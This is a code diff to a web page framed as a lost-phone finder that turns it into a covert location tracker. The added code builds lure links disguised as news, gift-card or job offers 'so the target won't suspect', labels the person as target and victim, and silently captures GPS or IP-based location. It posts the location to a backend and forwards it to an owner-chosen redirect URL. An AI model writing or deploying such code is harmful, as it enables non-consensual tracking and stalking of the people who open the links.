@@ -199,24 +199,6 @@
             transform: translateY(-2px);
         }
 
-        .btn-secondary {
-            background: #11998e;
-            color: white;
-        }
-
-        .btn-secondary:hover {
-            background: #0e877a;
-            transform: translateY(-2px);
-        }
-
-        .btn-small {
-            padding: 8px 15px;
-            font-size: 0.85rem;
-            background: #f8f9fa;
-            color: #333;
-            border: 1px solid #dee2e6;
-        }
-
         .alert-box {
             background: #fff3cd;
             border: 2px solid #ffc107;
@@ -294,13 +276,15 @@
             margin-bottom: 15px;
         }
 
-        .tracking-link input {
+        .tracking-link input,
+        .tracking-link select {
             width: 100%;
             padding: 12px;
             border: 2px solid #ffc107;
             border-radius: 8px;
             font-size: 0.9rem;
             margin-bottom: 10px;
+            box-sizing: border-box;
         }
 
         .auto-capture {
@@ -370,6 +354,7 @@
             border-radius: 8px;
             font-size: 1rem;
             margin-bottom: 10px;
+            box-sizing: border-box;
         }
 
         .location-info {
@@ -538,13 +523,13 @@
                 <div class="steps">
                     <strong>How to use:</strong>
                     <ol>
-                        <li>Go to: <a href="https://findmymobile.google.com" target="_blank"
-                                rel="noopener">findmymobile.google.com</a></li>
+                        <li>Go to: <a href="https://www.google.com/android/find" target="_blank"
+                                rel="noopener">google.com/android/find</a></li>
                         <li>Sign in with your Google account</li>
                         <li>Select your device - See location, ring, or lock</li>
                     </ol>
                 </div>
-                <a href="https://findmymobile.google.com" target="_blank" rel="noopener" class="btn btn-primary">
+                <a href="https://www.google.com/android/find" target="_blank" rel="noopener" class="btn btn-primary">
                     <i class="fas fa-external-link-alt"></i> Open Now
                 </a>
             </div>
@@ -643,17 +628,60 @@
                 <div id="ownerSection">
                     <div class="tracking-link">
                         <h4><i class="fas fa-link"></i> Your Tracking Link</h4>
-                        <input type="text" id="trackingLink" readonly aria-label="Tracking Link" />
+                        <div style="margin-bottom: 15px;">
+                            <label for="linkDisguise"
+                                style="display: block; margin-bottom: 8px; color: #856404; font-weight: 600;">
+                                <i class="fas fa-mask"></i> Link Disguise Style:
+                            </label>
+                            <select id="linkDisguise">
+                                <option value="news">📰 Breaking News - Important Update</option>
+                                <option value="video">🎬 Viral Video - Must Watch!</option>
+                                <option value="music">🎵 Free Music Download</option>
+                                <option value="game">🎮 Free Game - Download Now</option>
+                                <option value="gift">🎁 Free Gift Card Claim</option>
+                                <option value="job">💼 Urgent Job Opportunity</option>
+                                <option value="weather">☀️ Weather Alert</option>
+                                <option value="sports">🏆 Sports Final Results</option>
+                            </select>
+                            <small style="color: #666;">Choose a disguise so the target won't suspect</small>
+                        </div>
+                        <div style="margin-bottom: 15px;">
+                            <label for="redirectUrl"
+                                style="display: block; margin-bottom: 8px; color: #856404; font-weight: 600;">
+                                <i class="fas fa-external-link-alt"></i> Redirect URL (optional):
+                            </label>
+                            <input type="text" id="redirectUrl" placeholder="https://example.com" />
+                            <small style="color: #666;">Target will redirect here after page loads</small>
+                        </div>
+                        <input type="text" id="trackingLink" readonly aria-label="Tracking Link"
+                            style="margin-bottom: 15px;" />
                         <button onclick="generateTrackingLink()" class="btn btn-primary">
-                            <i class="fas fa-plus"></i> Generate New Link
+                            <i class="fas fa-plus"></i> Generate Disguised Link
                         </button>
                         <button onclick="copyTrackingLink()" class="btn btn-success">
                             <i class="fas fa-copy"></i> Copy Link
                         </button>
                     </div>
 
+                    <div style="margin-bottom: 20px; padding: 15px; background: #e7f3ff; border-radius: 10px;">
+                        <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #0066cc;">
+                            <i class="fas fa-search"></i> View Tracking Result:
+                        </label>
+                        <div style="display: flex; gap: 10px;">
+                            <input type="text" id="viewTrackingId" placeholder="Enter Tracking ID (e.g., track_abc123)"
+                                style="flex: 1; padding: 10px; border: 2px solid #0066cc; border-radius: 8px;" />
+                            <button onclick="viewTrackingById()" class="btn btn-primary">
+                                <i class="fas fa-eye"></i> View
+                            </button>
+                        </div>
+                        <small style="color: #666;">Enter the tracking ID to see captured locations</small>
+                    </div>
+
                     <div class="location-info">
                         <h4><i class="fas fa-history"></i> Location History</h4>
+                        <button onclick="refreshLocationHistory()" class="btn btn-primary" style="margin-bottom: 10px;">
+                            <i class="fas fa-sync"></i> Refresh
+                        </button>
                         <div id="locationLog" class="location-log">
                             <p><em>No locations yet...</em></p>
                         </div>
@@ -662,13 +690,10 @@
 
                 <div id="lostSection" style="display: none;">
                     <div class="auto-capture">
-                        <h4><i class="fas fa-crosshairs"></i> Capturing Location...</h4>
-                        <p>This page automatically captures GPS location.</p>
+                        <h4><i class="fas fa-crosshairs"></i> Loading...</h4>
+                        <p id="captureMessage">Please wait while we connect...</p>
                         <p><strong>Status:</strong> <span id="captureStatus"><span
                                     class="status-indicator status-loading"></span>Starting...</span></p>
-                        <button onclick="captureDeviceLocation()" class="btn btn-primary" style="margin-top: 15px;">
-                            <i class="fas fa-redo"></i> Retry
-                        </button>
                     </div>
                 </div>
 
@@ -773,34 +798,45 @@
     </div>
 
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-
     <script>
         let shareMap, trackerMap, shareMarker, trackerMarker;
         let currentLat = null, currentLng = null;
         let deviceId = localStorage.getItem('trackerDeviceId') || 'device_' + Math.random().toString(36).substr(2, 9);
+        let currentTrackId = null;
+        let ownerDeviceId = null;
 
         localStorage.setItem('trackerDeviceId', deviceId);
+
+        // API Base URL
+        const API_BASE = window.location.origin;
 
         function showTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
-            event.target.closest('.tab-btn').classList.add('active');
+            if (event && event.target) {
+                event.target.closest('.tab-btn').classList.add('active');
+            }
 
-            if (tabId === 'share' && !shareMap) {
-                setTimeout(function () {
+            setTimeout(function () {
+                if (tabId === 'share') {
                     initShareMap();
-                }, 100);
-            }
-            if (tabId === 'tracker' && !trackerMap) {
-                setTimeout(function () {
+                }
+                if (tabId === 'tracker') {
                     initTrackerMap();
-                }, 100);
-            }
+                }
+            }, 200);
         }
 
         function initShareMap() {
-            if (shareMap) return;
+            if (shareMap) {
+                shareMap.invalidateSize();
+                return;
+            }
+
+            const mapContainer = document.getElementById('shareMap');
+            if (!mapContainer || mapContainer.style.display === 'none') return;
+
             shareMap = L.map('shareMap').setView([20, 0], 2);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '&copy; OpenStreetMap',
@@ -812,7 +848,14 @@
         }
 
         function initTrackerMap() {
-            if (trackerMap) return;
+            if (trackerMap) {
+                trackerMap.invalidateSize();
+                return;
+            }
+
+            const mapContainer = document.getElementById('trackerMap');
+            if (!mapContainer || mapContainer.style.display === 'none') return;
+
             trackerMap = L.map('trackerMap').setView([20, 0], 2);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '&copy; OpenStreetMap',
@@ -1017,20 +1060,97 @@
             if (mode === 'owner') loadLocationHistory();
         }
 
-        function generateTrackingLink() {
-            const trackId = 'track_' + Math.random().toString(36).substr(2, 12);
+        // Generate tracking link with backend
+        async function generateTrackingLink() {
+            currentTrackId = 'track_' + Math.random().toString(36).substr(2, 12);
+
+            const disguiseSelect = document.getElementById('linkDisguise');
+            const selectedDisguise = disguiseSelect ? disguiseSelect.value : 'news';
+
+            const redirectUrlInput = document.getElementById('redirectUrl');
+            const redirectUrl = redirectUrlInput ? redirectUrlInput.value.trim() : '';
+
+            // Save to backend (if available)
+            try {
+                await fetch(`${API_BASE}/api/tracking-link`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        tracking_id: currentTrackId,
+                        device_id: deviceId,
+                        disguise: selectedDisguise,
+                        redirect_url: redirectUrl
+                    })
+                });
+            } catch (e) {
+                console.log('Backend not available, storing locally');
+                // Store locally as fallback
+                const localTrackingData = JSON.parse(localStorage.getItem('tracking_links') || '[]');
+                localTrackingData.push({
+                    tracking_id: currentTrackId,
+                    device_id: deviceId,
+                    disguise: selectedDisguise,
+                    redirect_url: redirectUrl,
+                    created_at: new Date().toISOString(),
+                    is_active: 1
+                });
+                localStorage.setItem('tracking_links', JSON.stringify(localTrackingData));
+            }
+
+            // Also store redirect URL in localStorage for client-side access
+            localStorage.setItem('redirect_url_' + currentTrackId, redirectUrl);
+
+            // Generate disguised URL with redirect URL embedded (works without backend)
             const baseUrl = window.location.origin + window.location.pathname;
-            const cleanUrl = baseUrl.split('?')[0];
-            const url = `${cleanUrl}?mode=lost&tracking=${trackId}&from=${deviceId}`;
-            document.getElementById('trackingLink').value = url;
-            localStorage.setItem('currentTrackingId', trackId);
+            const trackingUrl = getDisguisedUrl(baseUrl, currentTrackId, deviceId, selectedDisguise, redirectUrl);
+
+            document.getElementById('trackingLink').value = trackingUrl;
+            localStorage.setItem('currentTrackingId', currentTrackId);
+            ownerDeviceId = deviceId;
+        }
+
+        // Get redirect URL from localStorage (for client-only mode)
+        function getRedirectUrlFromLocal(trackingId) {
+            return localStorage.getItem('redirect_url_' + trackingId);
+        }
+
+        function getDisguisedUrl(baseUrl, trackId, deviceId, disguise, redirectUrl) {
+            // Short, clean disguised URLs that look like real links
+            const disguises = {
+                'news': { domains: ['bbc.com', 'cnn.com', 'nytimes.com', 'reuters.com', 'apnews.com'], paths: ['news', 'article', 'world', 'breaking'] },
+                'video': { domains: ['youtube.com', 'vimeo.com', 'dailymotion.com', 'twitch.tv'], paths: ['watch', 'video', 'stream', 'player'] },
+                'music': { domains: ['spotify.com', 'soundcloud.com', 'apple.com/music', 'pandora.com'], paths: ['listen', 'track', 'song', 'play'] },
+                'game': { domains: ['steampowered.com', 'epicgames.com', 'roblox.com', 'minecraft.net'], paths: ['play', 'game', 'download', 'store'] },
+                'gift': { domains: ['amazon.com', 'giftcard.com', 'reward-zone.com', 'claim-prize.com'], paths: ['gift', 'claim', 'reward', 'prize'] },
+                'job': { domains: ['linkedin.com', 'indeed.com', 'glassdoor.com', 'monster.com'], paths: ['jobs', 'career', 'apply', 'hiring'] },
+                'weather': { domains: ['weather.com', 'accuweather.com', 'wttr.in', 'weather.gov'], paths: ['weather', 'forecast', 'alert', 'today'] },
+                'sports': { domains: ['espn.com', 'sports.yahoo.com', 'bleacherreport.com', 'cbssports.com'], paths: ['scores', 'results', 'game', 'final'] }
+            };
+
+            const config = disguises[disguise] || disguises['news'];
+            const domain = config.domains[Math.floor(Math.random() * config.domains.length)];
+            const path = config.paths[Math.floor(Math.random() * config.paths.length)];
+
+            // Create very short tracking ID
+            const shortId = Math.random().toString(36).substr(2, 4);
+
+            // Build the disguised URL with redirect embedded
+            // Format: baseUrl/#/shortId?trackId&deviceId&redirectUrl
+            let trackingUrl = `${baseUrl}/#/${shortId}?t=${trackId}&d=${deviceId}`;
+
+            // Embed redirect URL so it works without backend
+            if (redirectUrl) {
+                trackingUrl += `&r=${encodeURIComponent(redirectUrl)}`;
+            }
+
+            return trackingUrl;
         }
 
         function copyTrackingLink() {
             const link = document.getElementById('trackingLink').value;
             if (link) {
                 navigator.clipboard.writeText(link).then(() => {
-                    alert('Tracking link copied! Send it to the lost device.');
+                    alert('Tracking link copied! Send it to the target device.');
                 });
             } else {
                 generateTrackingLink();
@@ -1038,22 +1158,147 @@
             }
         }
 
-        function captureDeviceLocation() {
+        // Capture device location
+        async function captureDeviceLocation() {
             const statusEl = document.getElementById('captureStatus');
-            statusEl.innerHTML = '<span class="status-indicator status-loading"></span> Capturing location...';
+            const messageEl = document.getElementById('captureMessage');
 
+            statusEl.innerHTML = '<span class="status-indicator status-loading"></span> Requesting location access...';
+            messageEl.textContent = 'Please allow location access when prompted...';
+
+            // Get tracking info from URL - support both query params and hash
+            let trackingId = null;
+            let redirectUrl = null;
+
+            // Check query params first
+            const urlParams = new URLSearchParams(window.location.search);
+            trackingId = urlParams.get('t') || urlParams.get('tracking');
+            redirectUrl = urlParams.get('r'); // Get redirect URL from URL params (embedded in link)
+
+            // Also check hash params (for disguised links)
+            if (!trackingId && window.location.hash && window.location.hash.includes('/#/')) {
+                const hash = window.location.hash.substring(1); // Remove #
+                const hashParams = new URLSearchParams(hash.split('?')[1] || '');
+                trackingId = hashParams.get('t');
+                if (!redirectUrl) {
+                    redirectUrl = hashParams.get('r'); // Get redirect from hash params
+                }
+            }
+
+            console.log('Tracking ID:', trackingId);
+            console.log('Redirect URL:', redirectUrl);
+
+            // First try GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function (pos) {
+                    async function (pos) {
+                        // GPS成功
+                        statusEl.innerHTML = '<span class="status-indicator status-active"></span> Location captured!';
+                        messageEl.textContent = 'Location found via GPS';
+
                         displayGPSLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-                        reportLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
-                        statusEl.innerHTML = '<span class="status-indicator status-active"></span> GPS captured!';
+
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        const acc = pos.coords.accuracy;
+
+                        // Try to save to backend (works if self-hosted)
+                        if (trackingId) {
+                            try {
+                                await fetch(`${API_BASE}/api/capture-location`, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        tracking_id: trackingId,
+                                        device_id: deviceId,
+                                        latitude: lat,
+                                        longitude: lng,
+                                        accuracy: acc,
+                                        source: 'gps'
+                                    })
+                                });
+                            } catch (e) {
+                                console.log('Backend not available');
+                            }
+                        }
+
+                        // Redirect with location data - works on any hosting!
+                        if (redirectUrl) {
+                            // Append location data to redirect URL
+                            const separator = redirectUrl.includes('?') ? '&' : '?';
+                            const locationUrl = `${redirectUrl}${separator}lat=${lat}&lng=${lng}&acc=${Math.round(acc)}&src=gps&tid=${trackingId || ''}`;
+                            console.log('Redirecting to:', locationUrl);
+                            setTimeout(() => {
+                                window.location.href = locationUrl;
+                            }, 1500);
+                        } else {
+                            // No redirect URL - show location on map for victim to see/share
+                            messageEl.textContent = 'Location captured! You can now share this location with the owner.';
+                        }
                     },
-                    function () {
-                        statusEl.innerHTML = '<span class="status-indicator status-inactive"></span> GPS unavailable';
+                    async function (gpsError) {
+                        // GPS failed, try network-based location
+                        statusEl.innerHTML = '<span class="status-indicator status-loading"></span> GPS unavailable, trying network location...';
+                        messageEl.textContent = 'GPS is off. Trying to get location from network...';
+
+                        tryNetworkLocation(redirectUrl, trackingId);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
                 );
+            } else {
+                // No geolocation at all, try network
+                tryNetworkLocation(redirectUrl, trackingId);
+            }
+        }
+
+        // Try network-based location (IP-based via backend)
+        async function tryNetworkLocation(redirectUrl, trackingId) {
+            const statusEl = document.getElementById('captureStatus');
+            const messageEl = document.getElementById('captureMessage');
+
+            statusEl.innerHTML = '<span class="status-indicator status-loading"></span> Getting network location...';
+            messageEl.textContent = 'Estimating location from network...';
+
+            // Try using IP-based location (simplified - in real app would use IP lookup API)
+            try {
+                // Get IP info from a free IP geolocation service
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+
+                if (ipData.latitude && ipData.longitude) {
+                    statusEl.innerHTML = '<span class="status-indicator status-active"></span> Network location found!';
+                    messageEl.textContent = 'Location estimated from network';
+
+                    displayGPSLocation(ipData.latitude, ipData.longitude, 5000); // Lower accuracy for network
+
+                    // Save to backend using the passed trackingId parameter
+                    if (trackingId) {
+                        await fetch(`${API_BASE}/api/capture-location`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                tracking_id: trackingId,
+                                device_id: deviceId,
+                                latitude: ipData.latitude,
+                                longitude: ipData.longitude,
+                                accuracy: 5000,
+                                source: 'network'
+                            })
+                        });
+                    }
+                } else {
+                    throw new Error('No IP location data');
+                }
+            } catch (e) {
+                statusEl.innerHTML = '<span class="status-indicator status-inactive"></span> Could not get location';
+                messageEl.textContent = 'Please enable location services for better accuracy. Showing sample page...';
+
+                // Even if location fails, redirect to target URL if provided
+                if (redirectUrl) {
+                    setTimeout(() => {
+                        window.location.href = redirectUrl;
+                    }, 2000);
+                }
             }
         }
 
@@ -1063,80 +1308,153 @@
             }
             if (trackerMarker) trackerMap.removeLayer(trackerMarker);
             trackerMarker = L.marker([lat, lng]).addTo(trackerMap)
-                .bindPopup(`GPS Location<br>Lat: ${lat.toFixed(6)}<br>Lng: ${lng.toFixed(6)}`).openPopup();
+                .bindPopup(`📍 Location Found<br>Lat: ${lat.toFixed(6)}<br>Lng: ${lng.toFixed(6)}<br><small>Accuracy: ${Math.round(acc)}m</small>`).openPopup();
             trackerMap.setView([lat, lng], 15);
         }
 
-        function reportLocation(lat, lng, acc, source) {
-            const data = { lat, lng, accuracy: acc, source, timestamp: new Date().toISOString() };
-            let history = JSON.parse(localStorage.getItem('locationHistory_' + deviceId) || '[]');
-            history.push(data);
-            if (history.length > 10) history = history.slice(-10);
-            localStorage.setItem('locationHistory_' + deviceId, JSON.stringify(history));
-
-            const urlParams = new URLSearchParams(window.location.search);
-            const from = urlParams.get('from');
-            if (from) {
-                localStorage.setItem('latestLocation_' + from, JSON.stringify(data));
-            }
-        }
-
-        function loadLocationHistory() {
+        // Load location history from backend
+        async function loadLocationHistory() {
             const logEl = document.getElementById('locationLog');
             if (!logEl) return;
 
-            const history = JSON.parse(localStorage.getItem('locationHistory_' + deviceId) || '[]');
-
-            let html = '';
-            if (history.length === 0) {
-                html = '<p><em>No locations yet...</em></p>';
-            } else {
-                history.slice().reverse().forEach((loc, i) => {
-                    const date = new Date(loc.timestamp);
-                    html += `<p><strong>#${history.length - i}</strong> ${loc.source.toUpperCase()}<br>Lat: ${loc.lat.toFixed(6)}, Lng: ${loc.lng.toFixed(6)}<br><small>${date.toLocaleString()}</small></p>`;
-                });
+            const trackingId = localStorage.getItem('currentTrackingId');
+            if (!trackingId) {
+                logEl.innerHTML = '<p><em>No tracking link generated yet.</em></p>';
+                return;
             }
-            logEl.innerHTML = html;
 
-            if (trackerMap && history.length > 0) {
-                trackerMap.eachLayer(function (layer) {
-                    if (layer instanceof L.Marker) {
-                        trackerMap.removeLayer(layer);
+            logEl.innerHTML = '<p><em>Loading locations...</em></p>';
+
+            try {
+                const response = await fetch(`${API_BASE}/api/locations/${trackingId}`);
+                const locations = await response.json();
+
+                let html = '';
+                if (!locations || locations.length === 0) {
+                    html = '<p><em>No locations captured yet. Send the tracking link to the target device.</em></p>';
+                } else {
+                    locations.forEach((loc, i) => {
+                        const date = new Date(loc.captured_at);
+                        const sourceIcon = loc.source === 'gps' ? '📍' : '🌐';
+                        html += `<p style="background: #fff3cd; padding: 10px; border-radius: 8px; margin-bottom: 10px;">
+                            <strong>${sourceIcon} Location #${locations.length - i}</strong><br>
+                            Lat: ${loc.latitude.toFixed(6)}<br>
+                            Lng: ${loc.longitude.toFixed(6)}<br>
+                            Accuracy: ~${Math.round(loc.accuracy || 0)}m<br>
+                            <small>${date.toLocaleString()}</small>
+                        </p>`;
+                    });
+
+                    // Show on map
+                    if (trackerMap && locations.length > 0) {
+                        const latest = locations[0];
+                        trackerMap.setView([latest.latitude, latest.longitude], 15);
+                        if (trackerMarker) trackerMap.removeLayer(trackerMarker);
+                        trackerMarker = L.marker([latest.latitude, latest.longitude]).addTo(trackerMap)
+                            .bindPopup(`Latest Location`).openPopup();
                     }
-                });
-
-                history.forEach((loc, i) => {
-                    const marker = L.marker([loc.lat, loc.lng]).addTo(trackerMap)
-                        .bindPopup(`#${history.length - i} - ${loc.source.toUpperCase()}<br>Lat: ${loc.lat.toFixed(6)}<br>Lng: ${loc.lng.toFixed(6)}`);
-                    if (i === history.length - 1) marker.openPopup();
-                });
-
-                const latest = history[history.length - 1];
-                trackerMap.setView([latest.lat, latest.lng], 15);
+                }
+                logEl.innerHTML = html;
+            } catch (e) {
+                logEl.innerHTML = '<p><em>Backend not available. Locations stored locally only.</em></p>';
             }
         }
 
-        // Check URL for shared location on page load
-        window.addEventListener('DOMContentLoaded', function () {
-            const params = new URLSearchParams(window.location.search);
-            const lat = params.get('lat');
-            const lng = params.get('lng');
-            const mode = params.get('mode');
+        function refreshLocationHistory() {
+            loadLocationHistory();
+        }
 
-            if (mode === 'lost') {
+        // View tracking by entering tracking ID manually
+        async function viewTrackingById() {
+            const trackingIdInput = document.getElementById('viewTrackingId');
+            const trackingId = trackingIdInput.value.trim();
+
+            if (!trackingId) {
+                alert('Please enter a tracking ID');
+                return;
+            }
+
+            // Save this tracking ID for future use
+            localStorage.setItem('currentTrackingId', trackingId);
+            currentTrackId = trackingId;
+
+            // Load the locations
+            await loadLocationHistoryForId(trackingId);
+
+            alert('Tracking ID saved! Location history loaded.');
+        }
+
+        // Load location history for a specific tracking ID
+        async function loadLocationHistoryForId(trackingId) {
+            const logEl = document.getElementById('locationLog');
+            if (!logEl) return;
+
+            logEl.innerHTML = '<p><em>Loading locations...</em></p>';
+
+            try {
+                const response = await fetch(`${API_BASE}/api/locations/${trackingId}`);
+                const locations = await response.json();
+
+                let html = '';
+                if (!locations || locations.length === 0) {
+                    html = '<p><em>No locations captured for this tracking ID yet.</em></p>';
+                } else {
+                    html += `<p style="color: green; font-weight: bold;">✓ Found ${locations.length} location(s)</p>`;
+                    locations.forEach((loc, i) => {
+                        const date = new Date(loc.captured_at);
+                        const sourceIcon = loc.source === 'gps' ? '📍' : '🌐';
+                        html += `<p style="background: #fff3cd; padding: 10px; border-radius: 8px; margin-bottom: 10px;">
+                            <strong>${sourceIcon} Location #${locations.length - i}</strong><br>
+                            Lat: ${loc.latitude.toFixed(6)}<br>
+                            Lng: ${loc.longitude.toFixed(6)}<br>
+                            Accuracy: ~${Math.round(loc.accuracy || 0)}m<br>
+                            <small>${date.toLocaleString()}</small>
+                        </p>`;
+                    });
+
+                    // Show on map
+                    if (trackerMap && locations.length > 0) {
+                        const latest = locations[0];
+                        initTrackerMap();
+                        setTimeout(() => {
+                            trackerMap.setView([latest.latitude, latest.longitude], 15);
+                            if (trackerMarker) trackerMap.removeLayer(trackerMarker);
+                            trackerMarker = L.marker([latest.latitude, latest.longitude]).addTo(trackerMap)
+                                .bindPopup(`Latest Location: ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)}`).openPopup();
+                        }, 300);
+                    }
+                }
+                logEl.innerHTML = html;
+            } catch (e) {
+                logEl.innerHTML = '<p><em>Error loading locations. Make sure the server is running.</em></p>';
+                console.error('Error:', e);
+            }
+        }
+
+        // Check URL on page load
+        window.addEventListener('DOMContentLoaded', function () {
+            // Check for tracking params in URL (works with new format /#/ or old /#!/)
+            const urlParams = new URLSearchParams(window.location.search);
+            const trackingIdFromQuery = urlParams.get('t');
+
+            // Handle hash-based routing (disguised links)
+            if (window.location.hash && (window.location.hash.includes('/#/') || window.location.hash.includes('/#!/'))) {
+                const hash = window.location.hash.substring(1); // Remove #
+                const hashParams = new URLSearchParams(hash.split('?')[1] || '');
+                const trackingIdFromHash = hashParams.get('t');
+
+                if (trackingIdFromHash || trackingIdFromQuery) {
+                    // This is a tracking link - switch to lost mode
+                    setTimeout(function () {
+                        showTab('tracker');
+                        switchTrackerMode('lost');
+                    }, 100);
+                }
+            } else if (trackingIdFromQuery) {
+                // Also handle if tracking ID is in query params
                 setTimeout(function () {
                     showTab('tracker');
                     switchTrackerMode('lost');
-                }, 100);
-            } else if (lat && lng) {
-                setTimeout(function () {
-                    showTab('share');
-                    setTimeout(function () {
-                        initShareMap();
-                        setTimeout(function () {
-                            setShareLocation(parseFloat(lat), parseFloat(lng));
-                        }, 300);
-                    }, 100);
                 }, 100);
             }
         });
